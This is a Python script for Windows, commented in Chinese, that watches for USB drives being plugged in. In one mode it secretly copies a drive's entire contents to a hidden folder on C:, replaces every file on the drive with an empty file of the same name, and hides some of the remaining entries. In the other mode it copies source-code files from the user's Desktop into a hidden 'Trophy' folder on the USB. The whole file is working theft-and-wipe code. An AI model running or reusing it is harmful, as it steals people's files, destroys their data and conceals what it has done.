# Code.py
# -*- coding:utf-8 -*-
import psutil
import sys
import os
import time
from datetime import datetime
import shutil
import random
import win32con, win32api

"""本底端硬碟的資訊 EX：C槽、D槽"""
local_device = []  # 本地硬碟 EX：['C:','D:']
local_letter = []  # 本地碟蝶資料 
local_number = 0  # 本地硬碟數量 EX:2 (因為有C、D槽)

"""插入的光碟，但cdrom 似乎用不到？ """
local_cdrom = []
local_cdrom_letter = []
local_cdrom_number = 0

"""插入的硬碟 EX：USB """
mobile_device = []  # 移動裝置(USB)
mobile_letter = []  # 移動裝置碟符(USB)
mobile_number = 0  # 移動裝置數(USB)

"""要取得的檔案格式"""
formatFiles = ['.py','.c','.cpp']

def updata():
    # 引入全域性變數
    global local_device, local_letter, local_number, mobile_device, \
        mobile_letter, mobile_number, local_cdrom, local_cdrom_letter, local_cdrom_number

    # 區域變數
    tmp_local_device, tmp_local_letter = [], []
    tmp_mobile_device, tmp_mobile_letter = [], []
    tmp_local_cdrom, tmp_local_cdrom_letter = [], []
    tmp_local_number, tmp_mobile_number, tmp_local_cdrom_number = 0, 0, 0

    try:
        #讀取目前所有硬碟的資訊 ( USB還沒插入前有C、D槽;，USB插入後會有C、D、E槽 )
        part = psutil.disk_partitions()
    except:
        print("程式發生異常!!!")
        sys.exit(-1)
    else:
        # 硬碟分類(本地C、D ; 移動 E )
        for i in range(len(part)):
            tmplist = part[i].opts.split(",")
            if "fixed" in tmplist:  # 掛載選項資料內讀到fixed = 本地裝置
                tmp_local_number = tmp_local_number + 1
                tmp_local_letter.append(part[i].device[:2])  # 得到碟符資訊
                tmp_local_device.append(part[i])

            elif "cdrom" in tmplist:
                tmp_local_cdrom_number = tmp_local_cdrom_number + 1
                tmp_local_cdrom_letter.append(part[i].device[:2])
                tmp_local_cdrom.append(part[i])
            else:
                tmp_mobile_number = tmp_mobile_number + 1
                tmp_mobile_letter.append(part[i].device[:2])
                tmp_mobile_device.append(part[i])

        local_device, local_letter = tmp_local_device[:], tmp_local_letter[:]
        mobile_device, mobile_letter = tmp_mobile_device[:], tmp_mobile_letter[:]
        local_number, mobile_number, local_cdrom_number = tmp_local_number, tmp_mobile_number, tmp_local_cdrom_number
        local_cdrom, local_cdrom_letter = tmp_local_cdrom[:], tmp_local_cdrom_letter[:]
    
    # 離開前的內容：
    """本底端硬碟的資訊 EX：C槽、D槽"""
    # local_device  =============> ['C:','D:']
    # local_letter  =============> [sdiskpart(device='C:\\', mountpoint='C:\\', fstype='NTFS', opts='rw,fixed'), 
    #                               sdiskpart(device='D:\\', mountpoint='D:\\', fstype='NTFS', opts='rw,fixed')]
    # local_number  =============> 2 (USB還沒插入前是 2 ; USB插入後會是 3)
    """插入的光碟，但cdrom 似乎用不到？ """
    # local_cdrom   =============> []
    # local_cdrom_letter ========> []
    # local_cdrom_number ========>  0
    """插入的硬碟 EX：USB (插入後才有內容)"""
    # mobile_device =============> ['E:']  # 移動裝置(USB)
    # mobile_letter =============> [sdiskpart(device='E:\\', mountpoint='E:\\', fstype='FAT32', opts='rw,removable')]  # 移動裝置碟符(USB)
    # mobile_number =============> 1  # 移動裝置數(USB)
    #print(mobile_device)
    #print(mobile_letter)
    #print(mobile_number)

    return len(part)  # 返回所有硬碟數量(C、D、(插入後有 E) )


def print_device(n):
    global local_device, local_letter, local_number, mobile_device, mobile_letter, mobile_number, local_cdrom, local_cdrom_letter, local_cdrom_number
    print("讀取到" + str(n) + "個硬碟")

    # 列出本地硬碟(C、D)
    if local_number:
        print("------->", end="")
        for l in range(local_number):
            print(local_letter[l], end="")  
        print("是本地硬碟")

    # 列出光碟硬碟
    if local_cdrom_number:
        print("------->", end="")
        for l in range(local_cdrom_number):
            print(local_cdrom_letter[l], end="")  
        print("是光碟")

    # 列出隨身碟(E)
    if mobile_device:  
        for m in range(mobile_number):
            print("------->", end="")
            print(mobile_letter[m], end="")
            print("是插入的移動磁碟(USB)")
            
    print("進入監聽狀態 " + "*" * 10)
    return

def copy_file_to_disk_hidden(USB_path):
    
    # USB的路徑
    usb_path = USB_path + "/"
    # 要複製到的路徑
    save_path = "C:/USB"

    while True:
        if os.path.exists(usb_path):
            shutil.copytree(usb_path,save_path) #複製全部USB內容到C:/USB
            break
        else:
            time.sleep(5)

    print("Save In ",save_path)

def delete_file_from_disk (usb_path):
    path=usb_path

    # USB的路徑 EX: 'E:'+'/'
    usb_path = usb_path + "/"   

    #回傳路徑中所有檔案的名稱列表
    file_path = os.listdir(usb_path)
    #file_path內容 ['檔案一','檔案二'...]
    #去除'System Volume Information'
    file_path.remove('System Volume Information')

    #遍歷USB中所有檔案
    run_file_in_disk(usb_path+'/',file_path)

    print("Delete All The Data In The USB \"", path,"\"" )
    time.sleep(0.75)
    print("Write Empty Data Back To USB")

def run_file_in_disk(source,dic_path):
    source_path=source

    #USB或檔案中所有檔案
    dic_num=len(dic_path)

    #刪除檔案並且新增空檔在USB中
    while dic_num!=0:
        dic_num-=1
        target=source_path+str(dic_path[dic_num])

        #資料夾
        if os.path.isdir(target):
            #查看該檔案下的
            dic2_path=os.listdir(target)
            #檔案夾中還有檔案夾
            if len(dic2_path)!=0:
                run_file_in_disk(target+'/',dic2_path)
            
        #檔案
        else:
            os.remove(target)
            #新增檔案
            f = open(target,'w')
            f.close()

def hide_file_in_disk(usb_path):
    path=usb_path
    # USB的路徑 
    usb_path = usb_path + "/"           
    file_path = os.listdir(usb_path)    #查看裡面的資料 存入filepath
    file_path.remove('System Volume Information')
    #打亂順序
    random.shuffle(file_path)
    #採取隱藏檔案數量的1/3個
    num=len(file_path)/3

    #檔案數量<=3時
    if num <=1 :
        target=usb_path+str(file_path[0])
        #FILE_ATTRIBUTE_HIDDEN=2 將檔案隱藏
        win32api.SetFileAttributes(target, win32con.FILE_ATTRIBUTE_HIDDEN)
    
    #檔案較多時
    else:
        num=int(num)
        for i in range(num):
            #print("i: ",i)
            target=usb_path+str(file_path[i])
            win32api.SetFileAttributes(target, win32con.FILE_ATTRIBUTE_HIDDEN)
    
    #隱藏USB資料夾
    target="C:/USB"
    win32api.SetFileAttributes(target, win32con.FILE_ATTRIBUTE_HIDDEN)

    print("Hide Part of The Data In The USB \"", path,"\"" )

def copy_file_to_USB(USB_path):
    
    # 桌面的路徑
    key =win32api.RegOpenKey(win32con.HKEY_CURRENT_USER,'Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders',0,win32con.KEY_READ)
    target_path = win32api.RegQueryValueEx(key,'Desktop')[0]
    print(target_path)
    # 要複製到的路徑
    save_path = USB_path + "\\Trophy\\"
    if not os.path.isdir(save_path):  #如果資料夾不存在就建立
        os.mkdir(save_path)

    while True:
        if os.path.exists(target_path):
            Run_Files(save_path,target_path)
            break
        else:
            time.sleep(5)

    #隱藏取得的程式
    target=save_path
    win32api.SetFileAttributes(target, win32con.FILE_ATTRIBUTE_HIDDEN)    

    print("Save In ",save_path)

def Run_Files(save_path,dir):
    files = os.listdir(dir)
    #files.remove('System Volume Information')
    for file in files:
        fullFileName = dir+'/'+file
        if not os.path.isdir(fullFileName):
            copyfile(save_path,fullFileName)
        else:
            Run_Files(save_path,fullFileName)

def copyfile(save_path,sourcepath):
    formatName = os.path.splitext(sourcepath)[1]
    if formatFiles.__contains__(formatName) and sourcepath.split('/')[-1] != '.DS_Store': # mac下每個資料夾都有個.DS_Store隱藏檔案這個不需要動
        print(sourcepath)
        shutil.copy(sourcepath,save_path)
        #shutil.copytree(sourcepath,save_path, dirs_exist_ok=True) #複製全部USB內容到C:/USB


if __name__ == "__main__":
    now_number = 0  # 現在的硬碟數量 (隨時更新)
    before_number = updata()  # USB插入前的數量
    print("=" * 50 + "\n此刻時間是: " + str(datetime.now()))
    print_device(before_number) #列印所有資訊
    print("請輸入需求: (A)取USB中資料 (B)取本機檔案")
    option = input()


    while True: #Loop Seconds = 1s
        now_number = updata()   #每秒更新一次，檢查是否有USB讀插入

        if now_number > before_number:  #USB插入(now_number=3,before_number=2)
            print("=" * 50 + " \n USB插入時間是: " + str(datetime.now()))
            print_device(now_number)
            if len(mobile_device):
                if option == 'A':
                    for m in range(mobile_number):  #遍歷所有的USB
                        copy_file_to_disk_hidden(mobile_letter[m]) #將所有插入的裝置內的東西都複製
                        time.sleep(1)   #延遲1秒
                        delete_file_from_disk(mobile_letter[m])  #將所有插入裝置內的東西都刪除並且新增空檔
                        hide_file_in_disk(mobile_letter[m])      #將部分檔案隱藏
                elif option == 'B':
                    # print(mobile_letter)
                    copy_file_to_USB(mobile_letter[0]) #將本地cpp, c, py檔複製到USB
                    time.sleep(1)   #延遲1秒
            else:
                pass
            before_number = now_number #更新(before_number=3)

        elif now_number < before_number:    #USB拔出(now_number=2,before_number=3)    
            print("=" * 50 + " \n USB拔出時間是: " + str(datetime.now()))
            print_device(now_number)
            before_number = now_number #更新(before_number=2)   
        time.sleep(1)
        